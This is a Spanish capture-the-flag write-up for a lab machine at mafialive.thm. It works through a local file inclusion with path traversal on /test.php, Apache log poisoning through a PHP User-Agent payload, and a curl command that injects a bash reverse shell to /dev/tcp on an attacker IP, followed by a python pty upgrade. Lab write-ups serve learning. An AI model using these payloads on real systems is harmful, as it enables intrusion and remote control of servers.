

Podemos ver la pagina tal cual poniendo la IP que nos dan, podemos ver que hay una dirección de correo, después de investigar por código fuente, intentar sacar directorios ocultos con **[[GOBUSTER]]** sin éxito.


![[Pasted image 20240606183734.png]]

Después de ver un correo en la pagina web (amarillo), cogeremos e iremos a la ruta`` /etc/hosts`` para hacer redireccionamiento DNS, por si nos devuelve otra información.

![[Pasted image 20240606184701.png]]

Pondremos primero la IP de la maquina y después el dominio para enlazar ip con dominio si no hacemos esto nos dará un fallo.

Despues de hacerlo, podemos ver que nos funciona, 

![[Pasted image 20240606184733.png]]

Tenemos la primera flag, aqui espezaremos a descubrir nuevos directorios.


Podemos ver que nos saca un archivo ``/test.php`` 

![[Pasted image 20240606185447.png]]

Podemos ver que es un LFI, ahora habra que explotarlo..

![[Pasted image 20240606190046.png]]


Si intentamos hacer un Path Traversal desde view=/.. esta capado y no nos deja pero si lo hacemos quitando el php funcionara

![[Pasted image 20240613233524.png]]

Siempre que sea haciendo .././.././.././.././ ya que de la otra forma esta capado 

``CTRL + U`` 

![[Pasted image 20240613233616.png]]

Ahora que tenemos acceso a /var/log/apache2/access.log podremos lanzar la vulnerabilidad llamada **log poisoning** a través de un curl y un codigo php

![[Pasted image 20240614000021.png]]

Vemos que nos devuelve la solicitud y después vamos al ``access.log`` y vemos la respuesta del comando ``whoami`` 

Actualizamos y vemos :

![[Pasted image 20240614000136.png]]
``
10.10.39.71 - - [14/Jun/2024:03:27:58 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log HTTP/1.1" 200 12191 "-" "``www-data````


También valdría con este comando :

![[Pasted image 20240614000617.png]]
curl -s -X GET 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log' -H "User-Agent: <?php system ('whoami'); ?>"

Después ejecutaremos la reverse shell ya que tenemos ejecución de comandos a través del User-Agent

Primero pondremos la terminar nuestra en escucha por el puerto que queramos, en este caso el 443 ya que es mas fácil que el firewall lo permita y uno que no este ocupado

![[Pasted image 20240618232248.png]]

Después de estar en escucha, iremos a https://www.revshells.com/ y buscaremos una revershell en este caso cogemos la de bash

``sh -i >& /dev/tcp/10.10.252.109/443 0>&1``


Ejecutamos el comando donde nos deja hacer la ejecución de comandos:

>curl -s -X GET 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log' -H "User-Agent: <?php system ('sh -i >& /dev/tcp/10.10.62.176/443 0>&1'); ?>"

(Tenemos que poner la IP atacante)
Actualizamos la pagina y se supone que ya tiene que haberse creado la shell inversa, ya estaremos dentro de la maquina 

![[Pasted image 20240618232332.png]]


Despues tendremos que hacer la consola interactiva, con python3 podremos ponerla:

![[Pasted image 20240618232755.png]]

> python3 -c 'import pty; pty.spawn("/bin/bash")'



Podemos ver que ya es interactiva, en cambio antes no

![[Pasted image 20240618232707.png]]

![[Pasted image 20240619001214.png]]


![[Pasted image 20240619001151.png]]




![[Pasted image 20240619001436.png]]


![[Pasted image 20240619001527.png]]


![[Pasted image 20240619001558.png]]

![[Pasted image 20240619001623.png]]

![[Pasted image 20240619001710.png]]


PATH HAJACKING